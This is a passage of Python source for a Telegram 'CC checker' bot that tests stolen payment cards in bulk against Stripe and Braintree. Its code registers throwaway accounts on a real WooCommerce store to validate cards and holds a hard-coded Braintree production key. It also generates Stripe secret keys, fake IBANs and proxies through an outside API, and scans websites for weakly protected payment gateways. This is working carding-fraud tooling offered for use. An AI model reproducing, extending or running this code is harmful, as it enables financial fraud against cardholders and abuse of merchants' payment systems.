        ]


        # Make the request to the secondary API
        other_response = requests.post(other_url, headers=other_headers, json=other_data)
        other_response_text = other_response.text

        # Evaluate the response directly
        response_status = categorize_response(other_response_text)

        # Measure the elapsed time
        elapsed_time = time.time() - start_time

        # Construct the formatted response for each card
        formatted_response = (
            f"[↯] CARD -» {card_number}|{card_exp_month}|{card_exp_year}|{card_cvc}\n"
            f"[↯] GATE -» STRIPE 1$\n\n"
            f"[↯] RESPONSE -» {response_status}\n\n"
            f"[↯] INFO -» {brand.upper()}\n"
            f"[↯] COUNTRY -» {country}\n"
            f"[↯] TRPE -» {type.upper()}\n"
            f"[↯] BIN -» {bin_number}\n"
            f"[↯] TIME -» {elapsed_time:.2f}⏳\n"
            f"- - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"
            )
        return formatted_response

    except Exception as e:
        logging.error(f"Error processing card: {str(e)}")
        return f"An error occurred: {str(e)}"

@bot.message_handler(func=lambda message: message.text.startswith(('/chk', '.chk')))
def handle_chk_command(message):
    try:
        user_id = message.from_user.id
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
            return

        # Detect source: replied message or current message
        if message.reply_to_message and message.reply_to_message.text:
            raw_text = message.reply_to_message.text
        else:
            raw_text = message.text

        # Extract valid CC lines using regex
        card_entries = re.findall(r'\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}', raw_text)

        card_info = parts[1]
        if '|' not in card_info or len(card_info.split('|')) != 4:
            bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
            return

        chat_id = message.chat.id
        initial_message = bot.send_message(chat_id, "ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇ $1")

        progress_steps = [
            "➤ SENDING REQUEST TO STRIPE ⏳ ",
            "➤ PROCESSING .",
            "➤ PROCESSING ..",
            "➤ PROCESSING ...",
            "➤ YOUR REQUEST RECIEVED "
        ]

        for step in progress_steps:
            time.sleep(0.5)
            bot.edit_message_text(step, chat_id=chat_id, message_id=initial_message.message_id)

        response = process_card(card_info, user_id)
        bot.edit_message_text(response, chat_id=chat_id, message_id=initial_message.message_id)

    except Exception as e:
        logging.error(f"Error processing request: {str(e)}")
        bot.reply_to(message, f"An error occurred: {str(e)}")
        
@bot.message_handler(func=lambda message: message.text.startswith(('.mchk', '/mchk')))
def handle_mchk_command(message):
    user_id = message.from_user.id
    cursor = get_cursor()
    cursor.execute("SELECT rank, premium_until FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if not user:
        bot.reply_to(message, "User not registered. Please register to use this feature.")
        return

    rank = user[0]
    premium_until = user[1]

    # Detect source: replied message or current message
    if message.reply_to_message and message.reply_to_message.text:
        raw_text = message.reply_to_message.text
    else:
        raw_text = message.text

    # Extract valid CC lines using regex
    card_entries = re.findall(r'\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}', raw_text)

    if not card_entries:
        bot.reply_to(message, "No valid CCs found. Please use format: `cc|mm|yy|cvv`")
        return

    # Start processing
    thread = threading.Thread(target=process_cards_batch, args=(bot, message, user_id, card_entries))
    thread.start()

def process_cards_batch(bot, message, user_id, card_entries):
    total_count = len(card_entries)
    initial_message = bot.reply_to(message, "Checking Your Cards ⌛")

    for i, card_info in enumerate(card_entries, start=1):
        card_info = card_info.strip()
        if '|' in card_info and len(card_info.split('|')) == 4:
            response = process_card(card_info, user_id)
            # Update the initial message with the current progress
            bot.edit_message_text(f"Processing [{i}/{total_count}]\n{response}", chat_id=message.chat.id, message_id=initial_message.message_id)
            
            # Send non-declined responses as a reply to the original messag
            if "DECLINED" not in response:
                bot.reply_to(message, response)
        else:
            response = "Please provide CC in the correct format: cc|mm|yy|cvv"
            bot.edit_message_text(f"Processing Error [{i}/{total_count}]\n{response}", chat_id=message.chat.id, message_id=initial_message.message_id)

    # Delete the initial progress message at the end
    bot.delete_message(message.chat.id, initial_message.message_id)

    # Send a final completion message
    bot.reply_to(message, "YOUR CC CHECKING HAS BEEN COMPLETED ✅ ")

def send_long_message(chat_id, message):
    for i in range(0, len(message), 4096):
        bot.send_message(chat_id, message[i:i + 4096])

def categorize_response(response):
    response = response.lower()

    charged_keywords = [
        "succeeded", "payment-success", "successfully", "thank you for your support",
        "your card does not support this type of purchase", "thank you",
        "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
        "thank you for membership", "payment received", "your order has been received",
        "purchase successful"
    ]
    
    insufficient_keywords = [
        "insufficient funds", "insufficient_funds", "payment-successfully"
    ]
    
    auth_keywords = [
        "mutation_ok_result" , "requires_action"
    ]

    ccn_cvv_keywords = [
        "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
        "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
        "cvv_check: pass", "security code is invalid", "security code is incorrect",
        "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
        "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
    ]

    live_keywords = [
        "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
    ]

    declined_keywords = [
        "declined", "do_not_honor", "generic_decline", "decline by your bank",
        "expired_card", "your card has expired", "incorrect_number",
        "card number is incorrect", "processing_error", "service_not_allowed",
        "lock_timeout", "card was declined", "fraudulent"
    ]

    if any(kw in response for kw in charged_keywords):
        return "CHARGED 🔥"
    elif any(kw in response for kw in ccn_cvv_keywords):
        return "CCN/CVV ✅"
    elif any(kw in response for kw in live_keywords):
        return "3D LIVE ✅"
    elif any(kw in response for kw in insufficient_keywords):
        return "INSUFFICIENT FUNDS 💰"
    elif any(kw in response for kw in auth_keywords):
        return "STRIPE AUTH ☑️ "
    elif any(kw in response for kw in declined_keywords):
        return "DECLINED ❌"
    else:
        return "UNKNOWN STATUS 👾"

# Handler for both /fl and .fl commands
@bot.message_handler(func=lambda msg: msg.text.startswith(("/fl", ".fl")))
def filter_cards(message):
    try:
        # Get the message text or replied message text
        if message.reply_to_message and message.reply_to_message.text:
            input_text = message.reply_to_message.text
        else:
            # Remove command prefix (/fl or .fl) from the text
            input_text = message.text[3:] if message.text.startswith('/fl') else message.text[3:]

        # Handle file attachments if present
        if message.reply_to_message and message.reply_to_message.document:
            file_info = bot.get_file(message.reply_to_message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            input_text = downloaded_file.decode('utf-8')

        # Process the input text
        if input_text:
            all_cards = input_text.split('\n')
        else:
            all_cards = []

        cards = ""
        for cc in all_cards:
            try:
                # Extract numbers using regex
                x = re.findall(r'\d+', cc)
                if len(x) >= 4:  # Ensure we have all required fields
                    ccn = x[0]    # Card number
                    mm = x[1]     # Month
                    yy = x[2]     # Year
                    cvv = x[3]    # CVV

                    # Fix common format issues
                    if mm.startswith('2'):  # If month starts with 2, swap with year
                        mm, yy = yy, mm
                    if len(mm) >= 3:       # If month is too long, rearrange
                        mm, yy, cvv = yy, cvv, mm

                    # Validate card number length
                    if 15 <= len(ccn) <= 16:
                        cards += f"{ccn}|{mm}|{yy}|{cvv}\n"
            except:
                continue

        # Send response based on results
        if cards:
            card_count = len(cards.split('\n')) - 1  # Subtract 1 for empty last line
            if card_count >= 32:
                # Save to file and send as document
                filename = 'Filtered_Cards.txt'
                with open(filename, 'w') as file:
                    file.write(cards)
                with open(filename, 'rb') as file:
                    bot.reply_to(message, f"Filtered {card_count} cards", parse_mode='HTML')
                    bot.send_document(message.chat.id, file, reply_to_message_id=message.message_id)
                os.remove(filename)
            else:
                # Send as text message
                bot.reply_to(
                    message,
                    f"<code>{cards}</code>",
                    parse_mode='HTML'
                )
        else:
            bot.reply_to(
                message,
                "<b>Filter Failed ⚠️\n\nNo Valid Cards Found in the Input.</b>",
                parse_mode='HTML'
            )

    except Exception as e:
        bot.reply_to(
            message,
            f"Error occurred: {str(e)}"
        )

       
@bot.message_handler(func=lambda msg: msg.text.startswith(("/sk", ".sk")))
def handle_sk_command(message):
    try:
        args = message.text.split()
        count = 1
        if len(args) > 1 and args[1].isdigit():
            count = min(int(args[1]), 10000)

        chat_id = message.chat.id
        progress_msg = bot.send_message(chat_id, " SENDING REQUEST TO API ⏳ ")

        progress_steps = [
            "➤ SENDING REQUEST TO SK API ⏳ ",
            "➤ PROCESSING .",
            "➤ PROCESSING ..",
            "➤ PROCESSING ...",
            "➤ YOUR REQUEST RECIEVED "
        ]

        last_text = ""
        for step in progress_steps:
            if step != last_text:
                try:
                    bot.edit_message_text(step, chat_id, progress_msg.message_id)
                    last_text = step
                except Exception:
                    pass
            time.sleep(0.4)

        # Fetch SKs
        api_url = f"https://drlabapis.onrender.com/api/skgenerator?count={count}"
        response = requests.get(api_url)
        sks = response.text.strip().split("\n")
        elapsed = time.time()

        # Format responses
        if count == 1:
            reply = (
                f"[✮] REQUEST RECIEVED \n\n"
                f"---------------------------\n"
                f"[↯] 𝘚𝘒 -» <code>{sks[0]}</code>\n"
                f"[↯] 𝙂𝘼𝙏𝙀𝙒𝗔𝗬 -» SK GEN\n"
                f"[↯] 𝙏𝙄𝙈𝙀 -» {elapsed:.2f}⏳\n"
                f"- - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik"
            )
            bot.edit_message_text(reply, chat_id, progress_msg.message_id, parse_mode="HTML")

        elif count <= 10:
            header = (
                f"[✮] REQUEST RECIEVED \n\n"
                f"[↯] 𝗔𝗠𝗢𝗨𝗡𝗧 -» {count}\n"
                f"[↯] 𝙂𝘼𝙏𝙀𝙒𝗔𝗬 -» SK GEN\n"
                f"[↯] 𝙏𝙄𝙈𝙀 -» {elapsed:.2f}⏳\n"
                f"---------------------------\n"
            )
            sk_list = "\n".join([f"[↯] 𝘚𝘒 -» <code>{sk}</code>" for sk in sks])
            footer = (
                f"\n- - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik"
            )
            full = header + sk_list + footer
            bot.edit_message_text(full, chat_id, progress_msg.message_id, parse_mode="HTML")

        else:
            # Create and send as .txt
            txt = BytesIO()
            txt_content = "\n".join(sks)
            txt.write(txt_content.encode())
            txt.seek(0)

            bot.edit_message_text(
                f"[✮] REQUEST RECIEVED \n\n"
                f"[↯] TOTAL SKs: {count}\n"
                f"[↯] SENT AS TEXT FILE 📄\n"
                f"[↯] TIME: {elapsed:.2f}⏳\n\n"
                f"---------------------------\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik",
                chat_id,
                progress_msg.message_id,
                parse_mode="HTML"
            )

            bot.send_document(chat_id, txt, visible_file_name=f"SKs_{count}.txt", caption=" SK Keys Generated ✅")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")

@bot.message_handler(func=lambda msg: msg.text and msg.text.lower().startswith(("/csk", ".csk")))
def handle_chsk_command(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            return bot.reply_to(message, "❌ Please provide an SK key to check.\nUsage: /csk <sk>")

        sk = args[1]
        chat_id = message.chat.id
        progress_msg = bot.send_message(chat_id, " CHECKING SK KEY ⏳ ")

        progress_steps = [
            "➤ SENDING REQUEST TO SK API ⏳ ",
            "➤ PROCESSING .",
            "➤ PROCESSING ..",
            "➤ PROCESSING ...",
            "➤ YOUR REQUEST RECIEVED "
        ]
        last_text = ""
        for step in progress_steps:
            if step != last_text:
                try:
                    bot.edit_message_text(step, chat_id, progress_msg.message_id)
                    last_text = step
                except Exception:
                    pass
            time.sleep(0.4)

        api_url = f"https://drlabapis.onrender.com/api/skchecker?sk={sk}"
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()

        valid = data.get("valid", False)

        if valid:
            reply = (
                f"[✮] VALID SK KEY ✅\n\n"
                f"---------------------------\n"
                f"[↯] SK: <code>{sk}</code>\n"
                f"[↯] RESPONSE CODE: {data.get('response', 'N/A')}\n"
                f"[↯] STATUS: VALID\n\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik"
            )
        else:
            reply = (
                f"[✮] INVALID SK KEY ❌\n\n"
                f"---------------------------\n"
                f"[↯] SK: <code>{sk}</code>\n"
                f"[↯] RESPONSE CODE: {data.get('response', 'N/A')}\n"
                f"[↯] STATUS: INVALID\n\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik"
            )

        bot.edit_message_text(reply, chat_id, progress_msg.message_id, parse_mode="HTML")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")
                

def check_vbv(card):
    import requests, re, random, string, base64
    from user_agent import generate_user_agent

    try:
        cc, mm, yy, cvv = card.strip().split("|")
        if "20" in yy: yy = yy.split("20")[1]
        r = requests.Session()
        user = generate_user_agent()

        headers = {'user-agent': user}
        r.get("https://forfullflavor.com/my-account/", headers=headers)
        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text).group(1)

        email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"
        username = ''.join(random.choices(string.ascii_lowercase, k=10))
        data = {
            'username': username, 'email': email, 'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/', 'register': 'Register'
        }
        r.post("https://forfullflavor.com/my-account/", data=data, headers=headers)

        r.get("https://forfullflavor.com/my-account/edit-address/billing/", headers=headers)
        addr_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text).group(1)

        fname, lname = "Bond", "James"
        city, state, street, zipc = "New York", "NY", "007 Secret St", "10001"
        data = {
            'billing_first_name': fname, 'billing_last_name': lname, 'billing_address_1': street,
            'billing_city': city, 'billing_state': state, 'billing_postcode': zipc,
            'billing_country': 'US', 'billing_phone': '303' + ''.join(random.choices(string.digits, k=7)),
            'billing_email': email, 'save_address': 'Save address',
            'woocommerce-edit-address-nonce': addr_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
        }
        r.post("https://forfullflavor.com/my-account/edit-address/billing/", headers=headers, data=data)

        r.get("https://forfullflavor.com/my-account/add-payment-method/", headers=headers)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text).group(1)
        client = re.search(r'client_token_nonce":"([^"]+)"', r.text).group(1)
        token_resp = r.post("https://forfullflavor.com/wp-admin/admin-ajax.php", data={
            'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client
        }, headers=headers)
        encoded = token_resp.json()['data']
        decoded = base64.b64decode(encoded).decode('utf-8')
        auth = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded)[0]

        token_headers = {
            'authorization': f'Bearer {auth}', 'braintree-version': '2018-05-10',
            'content-type': 'application/json', 'user-agent': user
        }
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'session'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear } } }',
            'variables': {'input': {'creditCard': {
                'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv
            }, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard'
        }
        token_response = requests.post("https://payments.braintree-api.com/graphql", headers=token_headers, json=json_data)
        token = token_response.json()['data']['tokenizeCreditCard']['token']

        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/', 'woocommerce_add_payment_method': '1'
        }
        final = r.post("https://forfullflavor.com/my-account/add-payment-method/", data=data, headers=headers)

        if 'Nice! New payment method added' in final.text or 'successfully' in final.text:
            return "APPROVED ✅"
        elif 'risk_threshold' in final.text:
            return "DECLINED ❌ - Risk"
        else:
            return "DECLINED ❌"
    except Exception as e:
        return f"ERROR: {str(e)}"

@bot.message_handler(func=lambda m: m.text.startswith(("/iban", ".iban")))
def iban_generator(message):
    try:
        args = message.text.split()
        country_code = args[1].upper() if len(args) > 1 else ""

        url = "https://drlabapis.onrender.com/api/generateiban"
        if country_code:
            url += f"?country={country_code}"

        progress = bot.send_message(message.chat.id, "🔄 Fetching IBAN...")

        steps = ["SENDING REQUEST", " Requesting ..", "🔄 Requesting ...", "✅ IBAN Ready"]
        for s in steps:
            time.sleep(0.4)
            try:
                bot.edit_message_text(s, message.chat.id, progress.message_id)
            except:
                pass

        res = requests.get(url)
        data = res.json()

        if data.get("status") != "ok":
            bot.edit_message_text("❌ Invalid country or API error.", message.chat.id, progress.message_id)
            return

        # Optional flag support
        flags = {
            "United Kingdom": "🇬🇧", "Germany": "🇩🇪", "France": "🇫🇷", "Spain": "🇪🇸",
            "Italy": "🇮🇹", "Netherlands": "🇳🇱", "Belgium": "🇧🇪", "Switzerland": "🇨🇭",
            "Poland": "🇵🇱", "Austria": "🇦🇹", "Ireland": "🇮🇪"
        }

        flag = flags.get(data.get("country", ""), "🏳️")

        response = (
            f"[✮] REQUEST RECIEVED \n\n"
            f"---------------------------\n"
            f"[↯] 𝗜𝗕𝗔𝗡 -» <code>{data.get('iban')}</code>\n"
            f"[↯] 𝗕𝗔𝗡𝗞 -» {data.get('bank_name')}\n"
            f"[↯] 𝗕𝗜𝗖 -» {data.get('bic')}\n"
            f"[↯] 𝗕𝗔𝗡𝗞 𝗖𝗢𝗗𝗘 -» {data.get('bank_code')}\n"
            f"[↯] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 -» {data.get('account_Code')}\n"
            f"[↯] 𝗕𝗥𝗔𝗡𝗖𝗛 -» {data.get('branch_code')}\n"
            f"[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 -» {data.get('country')} {flag}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 -» IBAN GEN\n"
            f"---------------------------\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik"
        )

        bot.edit_message_text(response, message.chat.id, progress.message_id, parse_mode="HTML")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")

@bot.message_handler(func=lambda m: m.text.startswith(("/proxy", ".proxy")))
def proxy_generator(message):
    try:
        args = message.text.split()
        protocol = "http"
        anonymity = "all"

        if len(args) > 1:
            protocol = args[1].lower()
        if len(args) > 2:
            anonymity = args[2].lower()

        if protocol not in ["http", "socks4", "socks5", "all"]:
            return bot.reply_to(message, "❌ Invalid protocol. Use: http, socks4, socks5, all.")
        if anonymity not in ["elite", "anonymous", "transparent", "all"]:
            return bot.reply_to(message, "❌ Invalid anonymity. Use: elite, anonymous, transparent, all.")

        status_msg = bot.send_message(message.chat.id, "🌐 Fetching fresh proxies...")

        # Progress
        steps = ["REQUESTING .", "REQUESTING ..", "REQUESTING ...", "PROXY READY ✅"]
        for s in steps:
            time.sleep(0.3)
            try: bot.edit_message_text(s, message.chat.id, status_msg.message_id)
            except: pass

        url = f"https://drlabapis.onrender.com/api/getproxy?protocol={protocol}&anonymity={anonymity}"
        res = requests.get(url)
        proxies = res.text.strip().split("\n")

        # Send based on quantity
        if len(proxies) > 10:
            txt = BytesIO()
            txt.write("\n".join(proxies).encode())
            txt.seek(0)

            caption = (
                f"[✮] REQUEST RECIEVED \n\n"
                f"---------------------------\n"
                f"[↯] TYPE -» {protocol.upper()} | {anonymity.upper()}\n"
                f"[↯] TOTAL -» {len(proxies)} PROXIES 📡\n"
                f"[↯] MODE -» .txt File\n"
                f"---------------------------\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik"
            )
            bot.edit_message_text("📤 Sending Proxies as .txt...", message.chat.id, status_msg.message_id)
            bot.send_document(message.chat.id, txt, visible_file_name="proxies.txt", caption=caption)

        else:
            preview = "\n".join([f"[↯] {p}" for p in proxies])
            result = (
                f"[✮] REQUEST RECIEVED \n\n"
                f"---------------------------\n"
                f"{preview}\n\n"
                f"[↯] TYPE -» {protocol.upper()} | {anonymity.upper()}\n"
                f"[↯] TOTAL -» {len(proxies)} PROXIES 📡\n"
                f"[↯] GATEWAY -» PROXY GEN\n"
                f"---------------------------\n"
                f"[✮] BOT BY --> MR.BOND\n"
                f"[✮] USERNAME --> taisirshaik"
            )
            bot.edit_message_text(result, message.chat.id, status_msg.message_id, parse_mode="HTML")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")

@bot.message_handler(func=lambda message: message.text.startswith(("/url", ".url")))
def cmd_url(message):
    try:
        _, url = message.text.split(maxsplit=1)
    except ValueError:
        bot.reply_to(message, "Usage: `.url <URL>` or `/url <URL>`")
        return

    if not is_valid_url(url.strip()):
        bot.reply_to(message, "Invalid URL. Please try again.")
        return

    detected_gateways, status_code, captcha, cloudflare, payment_security_type, cvv_cvc_status, inbuilt_status = check_url(url)
    gateways_str = ', '.join(detected_gateways) if detected_gateways else "None"
    bot.reply_to(
        message,
        f"🔍 URL: {url}\n"
        f"---------------------------\n"
        f"[↯] Payment Gateways: {gateways_str}\n"
        f"[↯] Captcha: {captcha}\n"
        f"[↯] Cloudflare: {cloudflare}\n"
        f"[↯] Security: {payment_security_type}\n"
        f"---------------------------\n"
        f"[↯] CVV/CVC: {cvv_cvc_status}\n"
        f"[↯] Inbuilt System: {inbuilt_status}\n"
        f"[↯] Status Code: {status_code}\n"
        "------------- OWNERS --------------"
      f"[✮] BOT BY --> MR.BOND\n"
        f"[✮] USERNAME --> taisirshaik\n"
        )
 
@bot.message_handler(func=lambda message: message.text.startswith(("/murl", ".murl")))
def cmd_murl(message):
    try:
        _, urls = message.text.split(maxsplit=1)
    except ValueError:
        bot.reply_to(message, "Usage: `.murl <URL1> <URL2> ...` or `/murl <URL1> <URL2> ...`")
        return

    urls = re.split(r'[\n\s]+', urls.strip())
    results = []

    for url in urls:
        if not is_valid_url(url.strip()):
            results.append(f"[↯] URL: {url} ➡ Invalid URL")
            continue

        detected_gateways, status_code, captcha, cloudflare, payment_security_type, cvv_cvc_status, inbuilt_status = check_url(url)
        gateways_str = ', '.join(detected_gateways) if detected_gateways else "None"
        results.append(
            f"🔍 URL: {url}\n"
             f"---------------------------\n"
            f"[↯] Payment Gateways: {gateways_str}\n"
            f"[↯] Captcha: {captcha}\n"
            f"[↯] Cloudflare: {cloudflare}\n"
            f"[↯] Security: {payment_security_type}\n"
            f"---------------------------\n"
            f"[↯] CVV/CVC: {cvv_cvc_status}\n"
            f"[↯] Inbuilt System: {inbuilt_status}\n"
            f"[↯] Status Code: {status_code}\n"
            f"------------- OWNERS --------------"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"            
        )

    if results:
        for result in results:
            if len(result) > 4096:
                send_long_message(message.chat.id, result)
            else:
                bot.reply_to(message, result)
    else:
        bot.reply_to(message, "No valid URLs detected. Please try again.")

def is_premium_user(user_id):
    cursor = get_cursor()
    cursor.execute("SELECT rank, premium_until FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        return False
    rank, premium_until = user
    return rank == 'PREMIUM' or user_id == OWNER_ID or (premium_until and time.strptime(premium_until, '%Y-%m-%d') > time.localtime())

@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    user_id = message.from_user.id

    # Check if the user is registered
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        bot.reply_to(message, "You need to register before using this feature. Please use /register.")
        return

    
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Ensure the directory exists
        os.makedirs('downloads', exist_ok=True)
        
        file_path = f"downloads/{file_info.file_path.split('/')[-1]}"
        
        # Log file path for debugging
        logging.info(f"Saving file to: {file_path}")
        
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # Store the file path for the user
        uploaded_files[user_id] = file_path

        # Inform the user that the file is ready for processing
        bot.reply_to(message, "File uploaded successfully. Type /combo to process the file.")

    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Telegram API error: {e}")
        bot.reply_to(message, "There was an error with the Telegram API while uploading your file. Please try again.")
    except FileNotFoundError as e:
        logging.error(f"File not found error: {e}")
        bot.reply_to(message, "An error occurred while accessing the file. Please try uploading again.")
    except Exception as e:
        logging.error(f"Unhandled exception: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please try again later.")

@bot.message_handler(commands=['combo'])
def handle_cvvtxt_command(message):
    user_id = message.from_user.id

    # Check if the user is registered
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    if not cursor.fetchone():
        bot.reply_to(message, "You need to register before using this feature. Please use /register.")
        return

    if user_id in uploaded_files:
        file_path = uploaded_files[user_id]
        if os.path.exists(file_path):
            thread = threading.Thread(target=process_file, args=(bot, message, file_path))
            thread.start()
        else:
            bot.reply_to(message, "File not found. Please upload again.")
    else:
        bot.reply_to(message, "No file uploaded. Please upload a file first.")
 
def process_file(bot, message, file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()

        results_count = {
            "CHARGED 🔥": 0,
            "CCN/CVV ✅": 0,
            "3D LIVE ✅": 0,
            "INSUFFICIENT FUNDS 💰": 0,
            "STRIPE AUTH ☑️": 0,
            "DECLINED ❌": 0,
            "UNKNOWN STATUS 👾": 0
        }

        initial_message = bot.reply_to(message, "WAIT WHILE YOUR CARDS ARE BEING CHECKED BY ➜ Mr. Bond BOT\n")

        for index, line in enumerate(lines):
            card_info = line.strip()

            if '|' not in card_info or len(card_info.split('|')) != 4:
                continue  # skip invalid lines

            try:
                response = process_card(card_info, message.from_user.id)
                response_category = categorize_response(response)

                if response_category in results_count:
                    results_count[response_category] += 1
                else:
                    results_count["UNKNOWN STATUS 👾"] += 1

                current_summary = (
                    f"CHARGED 🔥[{results_count['CHARGED 🔥']}]\n"
                    f"CCN/CVV ✅[{results_count['CCN/CVV ✅']}]\n"
                    f"3D LIVE ✅ [{results_count['3D LIVE ✅']}]\n"
                    f"INSUFFICIENT FUNDS 💰[{results_count['INSUFFICIENT FUNDS 💰']}]\n"
                    f"STRIPE AUTH ☑️[{results_count['STRIPE AUTH ☑️']}]\n"
                    f"DECLINED ❌[{results_count['DECLINED ❌']}]\n"
                    f"UNKNOWN STATUS 👾 [{results_count['UNKNOWN STATUS 👾']}]\n"
                )

                bot.edit_message_text(
                    f"YOUR CARDS ARE UNDER PROGRESS: {index + 1}/{len(lines)}\n{current_summary}",
                    chat_id=message.chat.id,
                    message_id=initial_message.message_id
                )

                if response_category != "DECLINED ❌":
                    bot.send_message(message.chat.id, response)

                time.sleep(1.5)

            except Exception as card_err:
                logging.error(f"Error checking card #{index + 1}: {card_info} | Error: {card_err}")
                results_count["UNKNOWN STATUS 👾"] += 1
                continue

        bot.delete_message(chat_id=message.chat.id, message_id=initial_message.message_id)

        final_summary = (
            "YOUR CHECKING COMPLETED:\n\n"
            f"CHARGED 🔥[{results_count['CHARGED 🔥']}]\n"
            f"CCN/CVV ✅[{results_count['CCN/CVV ✅']}]\n"
            f"3D LIVE ✅ [{results_count['3D LIVE ✅']}]\n"
            f"INSUFFICIENT FUNDS 💰[{results_count['INSUFFICIENT FUNDS 💰']}]\n"
            f"STRIPE AUTH ☑️[{results_count['STRIPE AUTH ☑️']}]\n"
            f"DECLINED ❌[{results_count['DECLINED ❌']}]\n"
            f"UNKNOWN STATUS 👾 [{results_count['UNKNOWN STATUS 👾']}]\n\n"
            f"---------------------------\n"
            "[✮] BOT BY : Mr. Bond\n"
            "[✮] USERNAME : @taisirshaik\n"
            "[✮] FOLLOW: @taisirshaik"
        )
        bot.send_message(message.chat.id, final_summary)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error processing file: {str(e)}")

    finally:
        if os.path.exists(file_path):
            os.remove(file_path)
        uploaded_files.pop(message.from_user.id, None)

def use_card_in_braintree(generated_card_data):
    card_number, expiration_month, expiration_year, cvv = generated_card_data.split('|')

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer production_w3jmfs6q_779b9vbjhk2bffsj',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'c08117f3-1760-4cb2-ae53-5671a874f3ca',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': expiration_month,
                    'expirationYear': expiration_year,
                    'cvv': cvv,
                    'cardholderName': 'AntifiedNull Prateek',
                    'billingAddress': {
                        'countryCodeAlpha2': 'IN',
                        'locality': 'Noida',
                        'region': 'UP',
                        'firstName': 'AntifiedNull',
                        'lastName': 'Prateek',
                        'postalCode': '201309',
                        'streetAddress': 'AntifiedNull',
                    },
                },
                'options': {
                    'validate': False,
                },
